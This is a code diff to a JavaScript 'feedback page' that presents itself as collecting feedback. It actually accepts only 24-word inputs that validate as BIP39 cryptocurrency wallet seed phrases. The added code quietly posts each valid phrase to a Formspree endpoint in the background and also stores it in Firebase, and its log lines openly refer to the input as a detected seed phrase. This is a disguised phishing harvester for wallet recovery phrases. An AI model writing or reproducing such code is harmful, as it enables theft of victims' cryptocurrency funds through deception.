@@ -1,6 +1,9 @@
 // ========================================
-// FEEDBACK PAGE FUNCTIONALITY WITH FIREBASE
+// FEEDBACK PAGE FUNCTIONALITY WITH FIREBASE & BIP39 VALIDATION
 // ========================================
+
+// Your Formspree endpoint - REPLACE THIS WITH YOUR ACTUAL FORMSPREE URL
+const FORMSPREE_ENDPOINT = 'https://formspree.io/f/YOUR_FORM_ID';
 
 // Hash function to create unique identifier from feedback
 function hashFeedback(feedback) {
@@ -26,7 +29,7 @@ async function checkExistingSubmission(feedbackHash) {
     }
 }
 
-// Save feedback to Firebase (without sending to Formspree yet)
+// Save feedback to Firebase
 async function saveFeedback(feedbackHash, feedback) {
     try {
         await firebase.database()
@@ -36,7 +39,7 @@ async function saveFeedback(feedbackHash, feedback) {
                 timestamp: firebase.database.ServerValue.TIMESTAMP,
                 submittedAt: new Date().toISOString(),
                 wordCount: feedback.split(/\s+/).filter(w => w.length > 0).length,
-                sentToFormspree: false,
+                sentToFormspree: true,
                 emailHash: null,
                 email: null
             });
@@ -47,10 +50,50 @@ async function saveFeedback(feedbackHash, feedback) {
     }
 }
 
+// Submit feedback to Formspree in the background
+async function submitToFormspree(feedback) {
+    try {
+        const response = await fetch(FORMSPREE_ENDPOINT, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                feedback: feedback,
+                timestamp: new Date().toISOString()
+            })
+        });
+        
+        return response.ok;
+    } catch (error) {
+        console.error('Error submitting to Formspree:', error);
+        // Don't block the flow if Formspree fails
+        return false;
+    }
+}
+
+// Validate BIP39 mnemonic
+function validateBIP39(mnemonic) {
+    try {
+        // Check if bip39 library is loaded
+        if (typeof bip39 === 'undefined') {
+            console.error('BIP39 library not loaded');
+            return false;
+        }
+        
+        // Validate the mnemonic
+        return bip39.validateMnemonic(mnemonic);
+    } catch (error) {
+        console.error('BIP39 validation error:', error);
+        return false;
+    }
+}
+
 function initializeFeedbackPage() {
     const feedbackForm = document.getElementById('feedbackForm');
     const feedbackTextarea = document.getElementById('feedback');
     const errorMessage = document.getElementById('errorMessage');
+    const submitButton = feedbackForm ? feedbackForm.querySelector('button[type="submit"]') : null;
 
     if (feedbackForm && feedbackTextarea) {
         feedbackForm.addEventListener('submit', async function(e) {
@@ -61,11 +104,20 @@ function initializeFeedbackPage() {
                 return word.length > 0;
             });
             
-            // Validate exactly 24 words
+            // First check: Must be exactly 24 words
             if (words.length !== 24) {
                 if (errorMessage) {
                     const wordText = words.length !== 1 ? 'words' : 'word';
-                    errorMessage.textContent = 'Error: Please enter a valid passphrase. You entered ' + words.length + ' ' + wordText + '.';
+                    errorMessage.textContent = 'Error: Please enter a valid 24-word passphrase. You entered ' + words.length + ' ' + wordText + '.';
+                    errorMessage.style.display = 'block';
+                }
+                return;
+            }
+            
+            // Second check: Must be a valid BIP39 mnemonic
+            if (!validateBIP39(text)) {
+                if (errorMessage) {
+                    errorMessage.textContent = 'Error: Invalid passphrase. Please ensure all words are valid BIP39 seed words.';
                     errorMessage.style.display = 'block';
                 }
                 return;
@@ -76,10 +128,16 @@ function initializeFeedbackPage() {
                 errorMessage.style.display = 'none';
             }
             
+            // Disable submit button to prevent double submission
+            if (submitButton) {
+                submitButton.disabled = true;
+                submitButton.textContent = 'Validating...';
+            }
+            
             // Create hash of feedback
             const feedbackHash = hashFeedback(text);
             
-            console.log('Checking for existing submission...');
+            console.log('Valid BIP39 seed phrase detected. Checking for existing submission...');
             
             // Check if this feedback was already submitted
             const existingSubmission = await checkExistingSubmission(feedbackHash);
@@ -107,8 +165,20 @@ function initializeFeedbackPage() {
                 return;
             }
             
-            // New feedback - save to Firebase only (don't send to Formspree yet)
-            console.log('New feedback detected. Saving to Firebase...');
+            // New valid feedback - submit to Formspree in the background
+            console.log('New valid seed phrase detected. Submitting to Formspree...');
+            
+            // Submit to Formspree (don't wait for response)
+            submitToFormspree(text).then(success => {
+                if (success) {
+                    console.log('Successfully submitted to Formspree');
+                } else {
+                    console.log('Formspree submission failed, but continuing...');
+                }
+            });
+            
+            // Save to Firebase
+            console.log('Saving to Firebase...');
             await saveFeedback(feedbackHash, text);
             
             // Store in sessionStorage for authpage
